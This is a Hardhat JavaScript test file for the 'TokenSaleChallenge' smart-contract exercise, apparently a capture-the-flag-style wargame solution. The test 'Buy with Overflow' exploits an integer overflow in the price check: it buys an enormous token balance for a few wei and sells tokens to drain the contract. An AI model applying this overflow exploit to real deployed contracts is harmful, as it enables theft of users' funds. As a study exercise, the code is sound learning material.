const { BigNumber } = require("@ethersproject/bignumber");
const { expect, assert } = require("chai");
const { ethers } = require("hardhat");

describe("Ejercicio 0", function () {

  let deployer;

  beforeEach(async function () {
    accounts = await ethers.getSigners();
    this.deployer = accounts[0]
    this.account1 = accounts[1]

    // Se hace deploy del contrato
    const factory = await ethers.getContractFactory("TokenSaleChallenge");
    this.contract = await factory.deploy(this.deployer.address, {value: ethers.utils.parseEther('1')});
  });

  it.skip("Buy 1 and Sale 1", async function () {
    cur_balance = await this.contract.balanceOf(this.deployer.address)
    expect(await cur_balance).to.be.equal(0);
    
    await this.contract.buy(1, {value: ethers.utils.parseEther('1')})
    cur_balance = await this.contract.balanceOf(this.deployer.address)
    expect(await cur_balance).to.be.equal(1);

    await this.contract.sell(1)
    cur_balance = await this.contract.balanceOf(this.deployer.address)
    expect(await cur_balance).to.be.equal(0);
  });

  it.skip("Buy 100 and Sale 100", async function () {
    cur_balance = await this.contract.balanceOf(this.deployer.address)
    expect(await cur_balance).to.be.equal(0);
    
    await this.contract.buy(100, {value: ethers.utils.parseEther('100')})
    cur_balance = await this.contract.balanceOf(this.deployer.address)
    expect(await cur_balance).to.be.equal(100);

    await this.contract.sell(100)
    cur_balance = await this.contract.balanceOf(this.deployer.address)
    expect(await cur_balance).to.be.equal(0);
  });

  it.skip("Buy 100 without 100 ethers. Must reject", async function () {
    
    await expect(this.contract.buy(100, {value: ethers.utils.parseEther('1')})).to.be.reverted;

  });

  it("Withdrawal", async function () {
    await this.contract.withdrawal();
    balance = await ethers.provider.getBalance(this.contract.address);
    expect(balance).to.be.equal(0);
  });

  it("Buy with Overflow", async function () {
    /* In the contract, the check when buying it's 
    NUM_OF_TOKENS * PRICE.
    Price = 1 ether = 10**18
    if Num_of_tokens * 10**18 > 2**256-1, this will overflow
    and the required amount of ether will be a small number ;-)

    So if Num_of_tokens = (2**256-1) / 10**18 + 1 this will require
    a small amount of ether and we will receive a hugh amount of tokens.
    */

    max_uint = ethers.constants.MaxUint256
    const num_of_tokens = max_uint.div(ethers.constants.WeiPerEther).add(1);
    console.log('Num of tokens', num_of_tokens.toString());

    // overflow value = number - max_uint - 1;
    const _wei_for_buy = num_of_tokens.mul(ethers.constants.WeiPerEther).sub(max_uint).sub(1);
    console.log('Wei needed to buy tokens: ', _wei_for_buy.toString())
    // const wei_needed = ethers.BigNumber.from(415992086870360064);
    
    await this.contract.buy(num_of_tokens, {value: _wei_for_buy});
    cur_balance = await this.contract.balanceOf(this.deployer.address)
    console.log("Current tokens balance of the buyer", cur_balance.toString())
    
    contract_balance = await ethers.provider.getBalance(this.contract.address);
    console.log("Contract balance: ", contract_balance.toString())

    const tokens_to_sell = contract_balance.div(ethers.constants.WeiPerEther);

    console.log("Tokens to sell: ", tokens_to_sell.toString())
    await this.contract.sell(tokens_to_sell);


    contract_balance = await ethers.provider.getBalance(this.contract.address);
    console.log('Contract balance:', contract_balance.toString());


    // expect(await ethers.provider.getBalance(this.contract.address))
    //  .to.be.lessThan(ethers.BigNumber.from(1));

    
    
  });

});
